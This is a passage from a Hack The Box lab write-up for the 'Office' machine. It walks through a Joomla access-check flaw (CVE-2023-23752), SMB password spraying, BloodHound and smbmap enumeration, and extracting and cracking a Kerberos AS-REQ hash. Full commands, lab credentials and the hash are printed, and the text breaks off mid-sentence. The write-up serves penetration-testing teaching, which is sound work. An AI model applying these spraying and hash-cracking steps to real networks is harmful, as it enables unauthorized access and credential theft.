<span class=line><span style=color:#e1e4e8>    &#x3C;/</span><span style=color:#85e89d>files</span><span style=color:#e1e4e8>></span></span>
<span class=line><span style=color:#e1e4e8>  &#x3C;/</span><span style=color:#85e89d>fileset</span><span style=color:#e1e4e8>></span></span>
<span class=line><span style=color:#e1e4e8>  &#x3C;</span><span style=color:#85e89d>updateservers</span><span style=color:#e1e4e8>></span></span>
<span class=line><span style=color:#e1e4e8>    &#x3C;</span><span style=color:#85e89d>server</span><span style=color:#b392f0> name</span><span style=color:#e1e4e8>=</span><span style=color:#9ecbff>"Joomla! Core"</span><span style=color:#b392f0> type</span><span style=color:#e1e4e8>=</span><span style=color:#9ecbff>"collection"</span><span style=color:#e1e4e8>>https://update.joomla.org/core/list.xml&#x3C;/</span><span style=color:#85e89d>server</span><span style=color:#e1e4e8>></span></span>
<span class=line><span style=color:#e1e4e8>  &#x3C;/</span><span style=color:#85e89d>updateservers</span><span style=color:#e1e4e8>></span></span>
<span class=line><span style=color:#e1e4e8>&#x3C;/</span><span style=color:#85e89d>extension</span><span style=color:#e1e4e8>></span></span>
<span class=line></span></code></pre><h2 id=foothold>Foothold<a href=#foothold class=anchor><span class=anchor-icon data-pagefind-ignore="">#</span></a></h2><ul><li>A quick search for vulnerabilities related to <code>Joomla 4.2.7</code> led to the discovery of <a href=https://github.com/K3ysTr0K3R/CVE-2023-23752-EXPLOIT><code>CVE-2023-23752 - Joomla Improper Access Check</code></a>.</li></ul><p><img alt=img decoding=async height=244 loading=lazy src=/_astro/Pasted%20image%2020240618234758.CTzhU-ch_1W8tWx.webp width=508></p><ul><li><p>This <code>CVE-2023-23752</code> relates to an improper access check within the application, which allows unauthorized access to critical web service endpoints.</p></li><li><p><a href=https://github.com/K3ysTr0K3R>K3ysTr0K3R</a> has an excellent Proof of Concept (PoC) that automates the collection of passwords and usernames to present them neatly.</p></li></ul><p><img alt="" decoding=async height=744 loading=lazy src=/_astro/Pasted%20image%2020240619000330._CpCKARF_Z2sy8f8.webp width=1141></p><ul><li>The pentester attempted to access the Joomla dashboard using the credentials <code>administrator : H0lOgrams4reTakIng0Ver754!</code>, but it didn’t work. At this point, the user enumeration process with the tool <code>kerbrute</code> had concluded. The pentester had a password (<code>H0lOgrams4reTakIng0Ver754!</code>) and a list of usernames, so he performed a <code>Password Spraying</code> attack using the tool <code>CrackMapExec</code> against the SMB service, discovering valid credentials: <code>dwolfe : H0lOgrams4reTakIng0Ver754!</code>.</li></ul><pre class="astro-code github-dark" data-language=bash style=background-color:#24292e;color:#e1e4e8;overflow-x:auto tabindex=0><code><span class=line><span style=color:#b392f0>crackmapexec</span><span style=color:#9ecbff> smb</span><span style=color:#79b8ff> 10.10.11.3</span><span style=color:#79b8ff> -u</span><span style=color:#9ecbff> users.txt</span><span style=color:#79b8ff> -p</span><span style=color:#9ecbff> 'H0lOgrams4reTakIng0Ver754!'</span><span style=color:#79b8ff> -d</span><span style=color:#9ecbff> OFFICE.HTB</span></span>
<span class=line><span style=color:#b392f0>SMB</span><span style=color:#79b8ff>         10.10.11.3</span><span style=color:#79b8ff>      445</span><span style=color:#9ecbff>    DC</span><span style=color:#e1e4e8>               [*] Windows Server 2022 Build 20348 (</span><span style=color:#b392f0>name:DC</span><span style=color:#e1e4e8>) (</span><span style=color:#b392f0>domain:OFFICE.HTB</span><span style=color:#e1e4e8>) (</span><span style=color:#b392f0>signing:True</span><span style=color:#e1e4e8>) (</span><span style=color:#b392f0>SMBv1:False</span><span style=color:#e1e4e8>)</span></span>
<span class=line><span style=color:#b392f0>SMB</span><span style=color:#79b8ff>         10.10.11.3</span><span style=color:#79b8ff>      445</span><span style=color:#9ecbff>    DC</span><span style=color:#e1e4e8>               [-] OFFICE.HTB</span><span style=color:#79b8ff>\a</span><span style=color:#e1e4e8>dministrator:H0lOgrams4reTakIng0Ver754</span><span style=color:#f97583>!</span><span style=color:#b392f0> STATUS_LOGON_FAILURE</span><span style=color:#e1e4e8> </span></span>
<span class=line><span style=color:#b392f0>SMB</span><span style=color:#79b8ff>         10.10.11.3</span><span style=color:#79b8ff>      445</span><span style=color:#9ecbff>    DC</span><span style=color:#e1e4e8>               [-] OFFICE.HTB</span><span style=color:#79b8ff>\A</span><span style=color:#e1e4e8>dministrator:H0lOgrams4reTakIng0Ver754</span><span style=color:#f97583>!</span><span style=color:#b392f0> STATUS_LOGON_FAILURE</span><span style=color:#e1e4e8> </span></span>
<span class=line><span style=color:#b392f0>SMB</span><span style=color:#79b8ff>         10.10.11.3</span><span style=color:#79b8ff>      445</span><span style=color:#9ecbff>    DC</span><span style=color:#e1e4e8>               [-] OFFICE.HTB</span><span style=color:#79b8ff>\e</span><span style=color:#e1e4e8>white:H0lOgrams4reTakIng0Ver754</span><span style=color:#f97583>!</span><span style=color:#b392f0> STATUS_LOGON_FAILURE</span><span style=color:#e1e4e8> </span></span>
<span class=line><span style=color:#b392f0>SMB</span><span style=color:#79b8ff>         10.10.11.3</span><span style=color:#79b8ff>      445</span><span style=color:#9ecbff>    DC</span><span style=color:#e1e4e8>               [-] OFFICE.HTB</span><span style=color:#79b8ff>\e</span><span style=color:#e1e4e8>tower:H0lOgrams4reTakIng0Ver754</span><span style=color:#f97583>!</span><span style=color:#b392f0> STATUS_LOGON_FAILURE</span><span style=color:#e1e4e8> </span></span>
<span class=line><span style=color:#b392f0>SMB</span><span style=color:#79b8ff>         10.10.11.3</span><span style=color:#79b8ff>      445</span><span style=color:#9ecbff>    DC</span><span style=color:#e1e4e8>               [+] OFFICE.HTB</span><span style=color:#79b8ff>\d</span><span style=color:#e1e4e8>wolfe:H0lOgrams4reTakIng0Ver754</span><span style=color:#f97583>!</span><span style=color:#e1e4e8> </span></span>
<span class=line></span></code></pre><ul><li>Since we have valid credentials for a domain user, we’ll use <code>bloodhound-python</code>, a Python-based ingestor for BloodHound, to extract domain information for further analysis.</li></ul><pre class="astro-code github-dark" data-language=bash style=background-color:#24292e;color:#e1e4e8;overflow-x:auto tabindex=0><code><span class=line><span style=color:#b392f0>sudo</span><span style=color:#9ecbff> bloodhound-python</span><span style=color:#79b8ff> -u</span><span style=color:#9ecbff> 'dwolfe'</span><span style=color:#79b8ff> -p</span><span style=color:#9ecbff> 'H0lOgrams4reTakIng0Ver754!'</span><span style=color:#79b8ff> -d</span><span style=color:#9ecbff> OFFICE.HTB</span><span style=color:#79b8ff> -c</span><span style=color:#9ecbff> all</span><span style=color:#79b8ff> -ns</span><span style=color:#79b8ff> 10.10.11.3</span></span>
<span class=line></span></code></pre><p><img alt="" decoding=async height=485 loading=lazy src=/_astro/Pasted%20image%2020240619123841.MjDI3flC_ZGFP4C.webp width=1432></p><ul><li>Afterward, we’ll compress all the <code>JSON</code> files into a <code>zip</code> file to upload them to BloodHound.</li></ul><pre class="astro-code github-dark" data-language=bash style=background-color:#24292e;color:#e1e4e8;overflow-x:auto tabindex=0><code><span class=line><span style=color:#b392f0>zip</span><span style=color:#9ecbff> office_ad.zip</span><span style=color:#79b8ff> *</span><span style=color:#9ecbff>json</span></span>
<span class=line></span></code></pre><p><img alt="" decoding=async height=176 loading=lazy src=/_astro/Pasted%20image%2020240619124003.Mir6cqrg_Z2jcvh6.webp width=619></p><p><img alt="" decoding=async height=424 loading=lazy src=/_astro/Pasted%20image%2020240619124652.PwCh86nG_1yjfN5.webp width=570></p><ul><li>Once the <code>json</code> files are uploaded, the domain is enumerated. I used several queries from the <code>Pre-Built Analytics Queries</code> and inspected the <code>Node Info</code> tab, but had no luck.</li></ul><p><img alt="" decoding=async height=789 loading=lazy src=/_astro/Pasted%20image%2020240619130201.B8Yh_Izj_2mNSjz.webp width=720></p><ul><li><p>Additionally, the pentester attempted to access the Joomla dashboard with this new set of credentials, but it didn’t work. Enumeration is an iterative process, and now that we have a set of credentials (<code>dwolfe</code> : <code>H0lOgrams4reTakIng0Ver754!</code>), he re-enumerated the SMB and WinRM services with these new credentials.</p></li><li><p>There was no success with the WinRM service, but SMB was successful. It was noted that there are shares accessible to the user <code>dwolfe</code>, among which the folder <code>SOC Analysis</code> stands out.</p></li></ul><pre class="astro-code github-dark" data-language=bash style=background-color:#24292e;color:#e1e4e8;overflow-x:auto tabindex=0><code><span class=line><span style=color:#b392f0>crackmapexec</span><span style=color:#9ecbff> smb</span><span style=color:#79b8ff> 10.10.11.3</span><span style=color:#79b8ff> -u</span><span style=color:#9ecbff> dwolfe</span><span style=color:#79b8ff> -p</span><span style=color:#9ecbff> 'H0lOgrams4reTakIng0Ver754!'</span><span style=color:#79b8ff> -d</span><span style=color:#9ecbff> OFFICE.HTB</span><span style=color:#79b8ff> --shares</span></span>
<span class=line><span style=color:#b392f0>SMB</span><span style=color:#79b8ff>         10.10.11.3</span><span style=color:#79b8ff>      445</span><span style=color:#9ecbff>    DC</span><span style=color:#e1e4e8>               [*] Windows Server 2022 Build 20348 (</span><span style=color:#b392f0>name:DC</span><span style=color:#e1e4e8>) (</span><span style=color:#b392f0>domain:OFFICE.HTB</span><span style=color:#e1e4e8>) (</span><span style=color:#b392f0>signing:True</span><span style=color:#e1e4e8>) (</span><span style=color:#b392f0>SMBv1:False</span><span style=color:#e1e4e8>)</span></span>
<span class=line><span style=color:#b392f0>SMB</span><span style=color:#79b8ff>         10.10.11.3</span><span style=color:#79b8ff>      445</span><span style=color:#9ecbff>    DC</span><span style=color:#e1e4e8>               [+] OFFICE.HTB</span><span style=color:#79b8ff>\d</span><span style=color:#e1e4e8>wolfe:H0lOgrams4reTakIng0Ver754</span><span style=color:#f97583>!</span><span style=color:#e1e4e8> </span></span>
<span class=line><span style=color:#b392f0>SMB</span><span style=color:#79b8ff>         10.10.11.3</span><span style=color:#79b8ff>      445</span><span style=color:#9ecbff>    DC</span><span style=color:#e1e4e8>               [+] Enumerated shares</span></span>
<span class=line><span style=color:#b392f0>SMB</span><span style=color:#79b8ff>         10.10.11.3</span><span style=color:#79b8ff>      445</span><span style=color:#9ecbff>    DC</span><span style=color:#9ecbff>               Share</span><span style=color:#9ecbff>           Permissions</span><span style=color:#9ecbff>     Remark</span></span>
<span class=line><span style=color:#b392f0>SMB</span><span style=color:#79b8ff>         10.10.11.3</span><span style=color:#79b8ff>      445</span><span style=color:#9ecbff>    DC</span><span style=color:#79b8ff>               -----</span><span style=color:#79b8ff>           -----------</span><span style=color:#79b8ff>     ------</span></span>
<span class=line><span style=color:#b392f0>SMB</span><span style=color:#79b8ff>         10.10.11.3</span><span style=color:#79b8ff>      445</span><span style=color:#9ecbff>    DC</span><span style=color:#9ecbff>               ADMIN</span><span style=color:#e1e4e8>$                          </span><span style=color:#9ecbff>Remote</span><span style=color:#9ecbff> Admin</span></span>
<span class=line><span style=color:#b392f0>SMB</span><span style=color:#79b8ff>         10.10.11.3</span><span style=color:#79b8ff>      445</span><span style=color:#9ecbff>    DC</span><span style=color:#9ecbff>               C</span><span style=color:#e1e4e8>$                              </span><span style=color:#9ecbff>Default</span><span style=color:#9ecbff> share</span></span>
<span class=line><span style=color:#b392f0>SMB</span><span style=color:#79b8ff>         10.10.11.3</span><span style=color:#79b8ff>      445</span><span style=color:#9ecbff>    DC</span><span style=color:#9ecbff>               IPC</span><span style=color:#e1e4e8>$            </span><span style=color:#9ecbff>READ</span><span style=color:#9ecbff>            Remote</span><span style=color:#9ecbff> IPC</span></span>
<span class=line><span style=color:#b392f0>SMB</span><span style=color:#79b8ff>         10.10.11.3</span><span style=color:#79b8ff>      445</span><span style=color:#9ecbff>    DC</span><span style=color:#9ecbff>               NETLOGON</span><span style=color:#9ecbff>        READ</span><span style=color:#9ecbff>            Logon</span><span style=color:#9ecbff> server</span><span style=color:#9ecbff> share</span><span style=color:#e1e4e8> </span></span>
<span class=line><span style=color:#b392f0>SMB</span><span style=color:#79b8ff>         10.10.11.3</span><span style=color:#79b8ff>      445</span><span style=color:#9ecbff>    DC</span><span style=color:#9ecbff>               SOC</span><span style=color:#9ecbff> Analysis</span><span style=color:#9ecbff>    READ</span><span style=color:#e1e4e8>            </span></span>
<span class=line><span style=color:#b392f0>SMB</span><span style=color:#79b8ff>         10.10.11.3</span><span style=color:#79b8ff>      445</span><span style=color:#9ecbff>    DC</span><span style=color:#9ecbff>               SYSVOL</span><span style=color:#9ecbff>          READ</span><span style=color:#9ecbff>            Logon</span><span style=color:#9ecbff> server</span><span style=color:#9ecbff> share</span><span style=color:#e1e4e8>  </span></span>
<span class=line></span></code></pre><ul><li>The pentester further enumerated the shared directory <code>SOC Analysis</code> using the tool <code>smbmap</code>.</li></ul><pre class="astro-code github-dark" data-language=bash style=background-color:#24292e;color:#e1e4e8;overflow-x:auto tabindex=0><code><span class=line><span style=color:#b392f0>smbmap</span><span style=color:#79b8ff> -u</span><span style=color:#9ecbff> dwolfe</span><span style=color:#79b8ff> -p</span><span style=color:#9ecbff> 'H0lOgrams4reTakIng0Ver754!'</span><span style=color:#79b8ff> -r</span><span style=color:#9ecbff> 'SOC Analysis'</span><span style=color:#79b8ff> -H</span><span style=color:#79b8ff> 10.10.11.3</span></span>
<span class=line></span>
<span class=line><span style=color:#b392f0>    ________</span><span style=color:#9ecbff>  ___</span><span style=color:#9ecbff>      ___</span><span style=color:#9ecbff>  _______</span><span style=color:#9ecbff>   ___</span><span style=color:#9ecbff>      ___</span><span style=color:#9ecbff>       __</span><span style=color:#9ecbff>         _______</span></span>
<span class=line><span style=color:#b392f0>   /</span><span style=color:#b392f0>"       )|"</span><span style=color:#79b8ff>  \ </span><span style=color:#9ecbff>   /"  ||   _  "</span><span style=color:#79b8ff>\ </span><span style=color:#f97583>|</span><span style=color:#b392f0>"  \    /"</span><span style=color:#f97583>  |</span><span style=color:#b392f0>     /</span><span style=color:#b392f0>""</span><span style=color:#b392f0>\</span><span style=color:#f97583>       |</span><span style=color:#b392f0>   __</span><span style=color:#9ecbff> "</span><span style=color:#79b8ff>\</span></span>
<span class=line><span style=color:#9ecbff>  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)</span></span>
<span class=line><span style=color:#9ecbff>   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/</span></span>
<span class=line><span style=color:#9ecbff>    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /</span></span>
<span class=line><span style=color:#9ecbff>   /"</span><span style=color:#79b8ff> \ </span><span style=color:#9ecbff>  :</span><span style=color:#e1e4e8>) </span><span style=color:#f97583>|</span><span style=color:#79b8ff>.</span><span style=color:#79b8ff>  \ </span><span style=color:#9ecbff>   /:</span><span style=color:#f97583>  ||</span><span style=color:#79b8ff>:</span><span style=color:#f97583> |</span><span style=color:#b392f0>_</span><span style=color:#e1e4e8>)  :)</span><span style=color:#f97583>|</span><span style=color:#79b8ff>.</span><span style=color:#79b8ff>  \ </span><span style=color:#9ecbff>   /:</span><span style=color:#f97583>  |</span><span style=color:#b392f0> /</span><span style=color:#9ecbff>   /</span><span style=color:#79b8ff>  \ </span><span style=color:#79b8ff>  \ </span><span style=color:#9ecbff> /</span><span style=color:#f97583>|</span><span style=color:#b392f0>__/</span><span style=color:#79b8ff> \</span></span>
<span class=line><span style=color:#e1e4e8>  (_______/  </span><span style=color:#f97583>|</span><span style=color:#b392f0>___</span><span style=color:#f97583>|</span><span style=color:#b392f0>\__/</span><span style=color:#f97583>|</span><span style=color:#b392f0>___</span><span style=color:#f97583>|</span><span style=color:#e1e4e8>(</span><span style=color:#b392f0>_______/</span><span style=color:#f97583> |</span><span style=color:#b392f0>___</span><span style=color:#f97583>|</span><span style=color:#b392f0>\__/</span><span style=color:#f97583>|</span><span style=color:#b392f0>___</span><span style=color:#f97583>|</span><span style=color:#e1e4e8>(</span><span style=color:#b392f0>___/</span><span style=color:#79b8ff>    \_</span><span style=color:#9ecbff>__</span><span style=color:#e1e4e8>)(</span><span style=color:#b392f0>_______</span><span style=color:#e1e4e8>)</span></span>
<span class=line><span style=color:#b392f0> -----------------------------------------------------------------------------</span></span>
<span class=line><span style=color:#b392f0>     SMBMap</span><span style=color:#9ecbff> -</span><span style=color:#9ecbff> Samba</span><span style=color:#9ecbff> Share</span><span style=color:#9ecbff> Enumerator</span><span style=color:#f97583> |</span><span style=color:#b392f0> Shawn</span><span style=color:#9ecbff> Evans</span><span style=color:#9ecbff> -</span><span style=color:#9ecbff> ShawnDEvans@gmail.com</span></span>
<span class=line><span style=color:#b392f0>                     https://github.com/ShawnDEvans/smbmap</span></span>
<span class=line></span>
<span class=line><span style=color:#e1e4e8>[</span><span style=color:#f97583>*</span><span style=color:#e1e4e8>] Detected 1 hosts serving SMB</span></span>
<span class=line><span style=color:#e1e4e8>[</span><span style=color:#f97583>*</span><span style=color:#e1e4e8>] Established 1 SMB session(</span><span style=color:#b392f0>s</span><span style=color:#e1e4e8>)                                </span></span>
<span class=line><span style=color:#e1e4e8>                                                                                                    </span></span>
<span class=line><span style=color:#e1e4e8>[+] IP: 10.10.11.3:445	Name: office.htb          	Status: Authenticated</span></span>
<span class=line><span style=color:#b392f0>	Disk</span><span style=color:#9ecbff>                                                  	Permissions</span><span style=color:#9ecbff>	Comment</span></span>
<span class=line><span style=color:#b392f0>	----</span><span style=color:#79b8ff>                                                  	-----------</span><span style=color:#79b8ff>	-------</span></span>
<span class=line><span style=color:#b392f0>	ADMIN$</span><span style=color:#9ecbff>                                            	NO</span><span style=color:#9ecbff> ACCESS</span><span style=color:#9ecbff>	Remote</span><span style=color:#9ecbff> Admin</span></span>
<span class=line><span style=color:#b392f0>	C$</span><span style=color:#9ecbff>                                                	NO</span><span style=color:#9ecbff> ACCESS</span><span style=color:#9ecbff>	Default</span><span style=color:#9ecbff> share</span></span>
<span class=line><span style=color:#b392f0>	IPC$</span><span style=color:#9ecbff>                                              	READ</span><span style=color:#9ecbff> ONLY</span><span style=color:#9ecbff>	Remote</span><span style=color:#9ecbff> IPC</span></span>
<span class=line><span style=color:#b392f0>	NETLOGON</span><span style=color:#9ecbff>                                          	READ</span><span style=color:#9ecbff> ONLY</span><span style=color:#9ecbff>	Logon</span><span style=color:#9ecbff> server</span><span style=color:#9ecbff> share</span><span style=color:#e1e4e8> </span></span>
<span class=line><span style=color:#b392f0>	SOC</span><span style=color:#9ecbff> Analysis</span><span style=color:#9ecbff>                                      	READ</span><span style=color:#9ecbff> ONLY</span><span style=color:#e1e4e8>	</span></span>
<span class=line><span style=color:#b392f0>	./SOC</span><span style=color:#9ecbff> Analysis</span></span>
<span class=line><span style=color:#b392f0>	dr--r--r--</span><span style=color:#79b8ff>                0</span><span style=color:#9ecbff> Wed</span><span style=color:#9ecbff> May</span><span style=color:#79b8ff> 10</span><span style=color:#9ecbff> 14:52:24</span><span style=color:#79b8ff> 2023</span><span style=color:#9ecbff>	.</span></span>
<span class=line><span style=color:#b392f0>	dr--r--r--</span><span style=color:#79b8ff>                0</span><span style=color:#9ecbff> Wed</span><span style=color:#9ecbff> Feb</span><span style=color:#79b8ff> 14</span><span style=color:#9ecbff> 05:18:31</span><span style=color:#79b8ff> 2024</span><span style=color:#9ecbff>	..</span></span>
<span class=line><span style=color:#b392f0>	fr--r--r--</span><span style=color:#79b8ff>          1372860</span><span style=color:#9ecbff> Wed</span><span style=color:#9ecbff> May</span><span style=color:#79b8ff> 10</span><span style=color:#9ecbff> 14:51:42</span><span style=color:#79b8ff> 2023</span><span style=color:#9ecbff>	Latest-System-Dump-8fbc124d.pcap</span></span>
<span class=line><span style=color:#b392f0>	SYSVOL</span><span style=color:#9ecbff>                                            	READ</span><span style=color:#9ecbff> ONLY</span><span style=color:#9ecbff>	Logon</span><span style=color:#9ecbff> server</span><span style=color:#9ecbff> share</span><span style=color:#e1e4e8> </span></span>
<span class=line></span></code></pre><ul><li>Noticing the existence of a <code>.pcap</code> file, that’s why he downloaded this file onto their attacker machine.</li></ul><pre class="astro-code github-dark" data-language=bash style=background-color:#24292e;color:#e1e4e8;overflow-x:auto tabindex=0><code><span class=line><span style=color:#b392f0>smbmap</span><span style=color:#79b8ff> -u</span><span style=color:#9ecbff> dwolfe</span><span style=color:#79b8ff> -p</span><span style=color:#9ecbff> 'H0lOgrams4reTakIng0Ver754!'</span><span style=color:#79b8ff> -H</span><span style=color:#79b8ff> 10.10.11.3</span><span style=color:#79b8ff> --download</span><span style=color:#9ecbff> 'SOC Analysis/Latest-System-Dump-8fbc124d.pcap'</span></span>
<span class=line></span>
<span class=line><span style=color:#b392f0>    ________</span><span style=color:#9ecbff>  ___</span><span style=color:#9ecbff>      ___</span><span style=color:#9ecbff>  _______</span><span style=color:#9ecbff>   ___</span><span style=color:#9ecbff>      ___</span><span style=color:#9ecbff>       __</span><span style=color:#9ecbff>         _______</span></span>
<span class=line><span style=color:#b392f0>   /</span><span style=color:#b392f0>"       )|"</span><span style=color:#79b8ff>  \ </span><span style=color:#9ecbff>   /"  ||   _  "</span><span style=color:#79b8ff>\ </span><span style=color:#f97583>|</span><span style=color:#b392f0>"  \    /"</span><span style=color:#f97583>  |</span><span style=color:#b392f0>     /</span><span style=color:#b392f0>""</span><span style=color:#b392f0>\</span><span style=color:#f97583>       |</span><span style=color:#b392f0>   __</span><span style=color:#9ecbff> "</span><span style=color:#79b8ff>\</span></span>
<span class=line><span style=color:#9ecbff>  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)</span></span>
<span class=line><span style=color:#9ecbff>   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/</span></span>
<span class=line><span style=color:#9ecbff>    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /</span></span>
<span class=line><span style=color:#9ecbff>   /"</span><span style=color:#79b8ff> \ </span><span style=color:#9ecbff>  :</span><span style=color:#e1e4e8>) </span><span style=color:#f97583>|</span><span style=color:#79b8ff>.</span><span style=color:#79b8ff>  \ </span><span style=color:#9ecbff>   /:</span><span style=color:#f97583>  ||</span><span style=color:#79b8ff>:</span><span style=color:#f97583> |</span><span style=color:#b392f0>_</span><span style=color:#e1e4e8>)  :)</span><span style=color:#f97583>|</span><span style=color:#79b8ff>.</span><span style=color:#79b8ff>  \ </span><span style=color:#9ecbff>   /:</span><span style=color:#f97583>  |</span><span style=color:#b392f0> /</span><span style=color:#9ecbff>   /</span><span style=color:#79b8ff>  \ </span><span style=color:#79b8ff>  \ </span><span style=color:#9ecbff> /</span><span style=color:#f97583>|</span><span style=color:#b392f0>__/</span><span style=color:#79b8ff> \</span></span>
<span class=line><span style=color:#e1e4e8>  (_______/  </span><span style=color:#f97583>|</span><span style=color:#b392f0>___</span><span style=color:#f97583>|</span><span style=color:#b392f0>\__/</span><span style=color:#f97583>|</span><span style=color:#b392f0>___</span><span style=color:#f97583>|</span><span style=color:#e1e4e8>(</span><span style=color:#b392f0>_______/</span><span style=color:#f97583> |</span><span style=color:#b392f0>___</span><span style=color:#f97583>|</span><span style=color:#b392f0>\__/</span><span style=color:#f97583>|</span><span style=color:#b392f0>___</span><span style=color:#f97583>|</span><span style=color:#e1e4e8>(</span><span style=color:#b392f0>___/</span><span style=color:#79b8ff>    \_</span><span style=color:#9ecbff>__</span><span style=color:#e1e4e8>)(</span><span style=color:#b392f0>_______</span><span style=color:#e1e4e8>)</span></span>
<span class=line><span style=color:#b392f0> -----------------------------------------------------------------------------</span></span>
<span class=line><span style=color:#b392f0>     SMBMap</span><span style=color:#9ecbff> -</span><span style=color:#9ecbff> Samba</span><span style=color:#9ecbff> Share</span><span style=color:#9ecbff> Enumerator</span><span style=color:#f97583> |</span><span style=color:#b392f0> Shawn</span><span style=color:#9ecbff> Evans</span><span style=color:#9ecbff> -</span><span style=color:#9ecbff> ShawnDEvans@gmail.com</span></span>
<span class=line><span style=color:#b392f0>                     https://github.com/ShawnDEvans/smbmap</span></span>
<span class=line></span>
<span class=line><span style=color:#e1e4e8>[</span><span style=color:#f97583>*</span><span style=color:#e1e4e8>] Detected 1 hosts serving SMB</span></span>
<span class=line><span style=color:#e1e4e8>[</span><span style=color:#f97583>*</span><span style=color:#e1e4e8>] Established 1 SMB session(</span><span style=color:#b392f0>s</span><span style=color:#e1e4e8>)                                </span></span>
<span class=line><span style=color:#e1e4e8>[+] Starting download: SOC Analysis</span><span style=color:#79b8ff>\L</span><span style=color:#e1e4e8>atest-System-Dump-8fbc124d.pcap (</span><span style=color:#b392f0>1372860</span><span style=color:#9ecbff> bytes</span><span style=color:#e1e4e8>)</span></span>
<span class=line><span style=color:#e1e4e8>[+] File output to: /home/kali/HTB/Office/content/10.10.11.3-SOC Analysis_Latest-System-Dump-8fbc124d.pcap</span></span>
<span class=line></span></code></pre><ul><li>To conduct a more in-depth analysis, the pentester opens the file with <code>Wireshark</code>. Within the packet flow, he noticed the existence of multiple protocols, but one in particular caught his attention: the <code>Kerberos</code> protocol, as these could contain <code>Service Tickets</code> encrypted with the <code>Secret Key of a service</code> (<code>Kerberoasting Attack</code>), potentially allowing the generation of a hash to crack later, etc.</li></ul><p><img alt=img decoding=async height=564 loading=lazy src=/_astro/Pasted%20image%2020240619101412.BCM_PN3Z_ZSvnVU.webp width=1851></p><h2 id=understanding-as-reqroasting-attack>Understanding <strong>AS-REQroasting attack</strong><a href=#understanding-as-reqroasting-attack class=anchor><span class=anchor-icon data-pagefind-ignore="">#</span></a></h2><ul><li>After the pentester filtered for packets belonging to the <code>Kerberos</code> protocol, he observed that these packets were part of an <code>AS-REQ</code>. Therefore, it is possible to attempt to exploit the <code>AS-REQroasting attack</code>. To do this, it is necessary to generate the hash in <code>Hashcat</code> format. Since this uses <code>Encryption Type 18</code>, according to the official documentation of <a href="https://hashcat.net/wiki/doku.php?id=example_hashes"><code>Hashcat</code></a>, this corresponds to <code>mode</code> <code>19900</code> and requires the following fields:</li></ul><pre class="astro-code github-dark" data-language=shell style=background-color:#24292e;color:#e1e4e8;overflow-x:auto tabindex=0><code><span class=line><span style=color:#e1e4e8>$krb5pa$18$</span><span style=color:#f97583>&#x3C;</span><span style=color:#e1e4e8>principal_name_here</span><span style=color:#f97583>></span><span style=color:#e1e4e8>$HASHCATDOMAIN.COM$</span><span style=color:#f97583>&#x3C;</span><span style=color:#e1e4e8>cipher_bytes_here</span><span style=color:#f97583>></span></span>
<span class=line></span></code></pre><blockquote><p>Comments: It’s interesting to note that the existence of the 2 captured packets in the <code>Kerberos traffic</code> is due to the fact that in the first packet, the user <code>tstark</code> attempted to authenticate by providing only their <code>username</code>, which was rejected by the <code>KDC</code> service. The KDC then requested a <code>timestamp</code> (<code>TS</code>) encrypted with the user’s secret. Consequently, in the second packet, we can see how the user <code>tstark</code> sent this information. This highlights that <code>Kerberos Pre-Authentication is enabled</code>, thereby preventing an <code>AS-REProasting Attack</code> from being exploited.</p><p><strong>First packet</strong></p><p><img alt=img decoding=async height=602 loading=lazy src=/_astro/Pasted%20image%2020240619113310.BqbjIQQ1_j5wcT.webp width=940></p><p><strong>Second packet</strong></p><p><img alt=img decoding=async height=635 loading=lazy src=/_astro/Pasted%20image%2020240619112617.m6o_mr-R_Z6m8VM.webp width=938></p></blockquote><blockquote><p>Tip: The essence of the <code>AS-REProasting Attack</code> is as follows: When you do not enforce <code>pre-authentication</code>, a malicious attacker can directly send a <code>dummy request for authentication</code>. The <code>KDC</code> will return an encrypted <code>TGT</code> and <code>TGS' Session Key</code> encrypted with the <code>user secret key</code>. It is evident that the encrypted <code>TGS' Session Key</code> is attractive to the attacker because it can brute-force it offline in order to discover the <code>user's secret</code>.</p><p>If you want to see more, <a href=https://rioasmara.com/author/rioasmara/ >rioasmara</a> has a <a href=https://rioasmara.com/2020/07/04/kerberoasting-as-req-pre-auth-vs-non-pre-auth/ >post</a> where he compares the behavior when <code>PRE-AUTH</code> (<strong>Kerberos preauthentication</strong>) is enabled versus when it’s not, showing packet captures in Wireshark. {: .prompt-tip }</p></blockquote><ul><li>Visualizing the captured Kerberos traffic in Wireshark, we can identify the following fields in the second Kerberos packet:</li></ul><p><img alt=img decoding=async height=790 loading=lazy src=/_astro/Pasted%20image%2020240619122115.36aCZl6W_ZiF9Dl.webp width=1106></p><ul><li>Thus, the resulting hash is:</li></ul><pre class="astro-code github-dark" data-language=shell style=background-color:#24292e;color:#e1e4e8;overflow-x:auto tabindex=0><code><span class=line><span style=color:#e1e4e8>$krb5pa$18$tstark$OFFICE.HTB$a16f4806da05760af63c566d566f071c5bb35d0a414459417613a9d67932a6735704d0832767af226aaa7360338a34746a00a3765386f5fc</span></span>
<span class=line></span></code></pre><h2 id=shell-as-tstark-user-and-usertxt>Shell as “tstark” user and <strong>user.txt</strong><a href=#shell-as-tstark-user-and-usertxt class=anchor><span class=anchor-icon data-pagefind-ignore="">#</span></a></h2><ul><li>The pentester cracked the hash with <code>hashcat</code>, discovering that the password for the user <code>tstark</code> is presumably <code>playboy69</code>.</li></ul><p><img alt=img decoding=async height=928 loading=lazy src=/_astro/Pasted%20image%2020240619123145.D1m1cI8C_xzshu.webp width=1560></p><ul><li>With this, the pentester observed once again the information provided by <code>BloodHound</code> for the user <code>tstark</code> and noticed that <code>tstark</code> is part of the <code>Registry Editors</code> group, as well as domain user <code>ppotts</code>.</li></ul><p><img alt=img decoding=async height=507 loading=lazy src=/_astro/Pasted%20image%2020240619131543.CeTbo31V_Z1HWXxJ.webp width=733></p><ul><li>The pentester has obtained new credentials (<code>tstark</code> : <code>playboy69</code>). Enumeration is an iterative process; however, this time access to the target via WinRM was unsuccessful, and no interesting files were found in SMB. Therefore, the pentester attempted to access the <code>admin</code> dashboard of Joomla with this new pair of credentials, but had no luck. Later, using the same password, the pentester tried the <code>administrator</code> username and successfully logged in!</li></ul><p><img alt=img decoding=async height=402 loading=lazy src=/_astro/Pasted%20image%2020240619140237.o1eofVy4_Mtupt.webp width=399></p><ul><li>Then, exploiting 